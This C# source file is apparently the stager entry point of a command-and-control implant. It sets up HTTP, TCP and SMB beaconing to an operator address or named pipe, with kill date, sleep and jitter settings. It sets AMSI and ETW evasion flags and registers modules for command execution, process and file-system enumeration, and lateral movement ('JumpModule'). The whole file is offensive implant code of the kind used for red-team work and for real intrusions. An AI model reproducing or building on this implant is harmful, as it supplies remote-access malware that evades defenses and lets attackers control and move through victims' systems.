using Agent.Comms;
using Agent.Controllers;
using Agent.Interfaces;
using Agent.Models;
using Agent.Modules;

using System;

namespace Agent
{
    public class Stage
    {
        static string ID;
        static string ParentID;
        static byte[] SessionKey;

        public static void HTTPEntry(string AgentID, byte[] EncKey, DateTime KillDate, string ConnectAddress, int ConnectPort, int SleepInterval, int SleepJitter)
        {
            ID = AgentID;
            SessionKey = EncKey;

            var config = new ConfigController();
            config.Set(AgentConfig.KillDate, KillDate);
            config.Set(AgentConfig.SleepInterval, SleepInterval);
            config.Set(AgentConfig.SleepJitter, SleepJitter);

            var commModule = new HTTPCommModule(ID, ConnectAddress, ConnectPort);

            Execute(config, commModule);
        }

        public static void TCPEntry(string AgentID, string ParentAgentID, byte[] EncKey, DateTime KillDate, string BindAddress, int BindPort)
        {
            ID = AgentID;
            ParentID = ParentAgentID;
            SessionKey = EncKey;

            var config = new ConfigController();
            config.Set(AgentConfig.KillDate, KillDate);

            var commModule = new TCPCommModule(BindAddress, BindPort);

            Execute(config, commModule);
        }

        public static void SMBEntry(string AgentID, string ParentAgentID, byte[] EncKey, DateTime KillDate, string PipeName)
        {
            ID = AgentID;
            ParentID = ParentAgentID;
            SessionKey = EncKey;

            var config = new ConfigController();
            config.Set(AgentConfig.KillDate, KillDate);

            var commModule = new SMBCommModule(PipeName);

            Execute(config, commModule);
        }

        static void Execute(ConfigController Config, ICommModule CommModule)
        {
            Config.Set(AgentConfig.DisableAMSI, false);
            Config.Set(AgentConfig.PPID, System.Diagnostics.Process.GetCurrentProcess().Id);
            Config.Set(AgentConfig.DisableAMSI, false);
            Config.Set(AgentConfig.DisableETW, false);

            var agent = new AgentController(ID, SessionKey, CommModule, Config);

            CommModule.Init(Config);
            CommModule.Start();

            agent.RegisterAgentModule(new CoreModule());
            agent.RegisterAgentModule(new NetModule());
            agent.RegisterAgentModule(new DirectoryModule());
            agent.RegisterAgentModule(new DriveModule());
            agent.RegisterAgentModule(new EnvModule());
            agent.RegisterAgentModule(new ExecModule());
            agent.RegisterAgentModule(new ProcModule());
            agent.RegisterAgentModule(new JumpModule());

            agent.Start();
        }
    }
}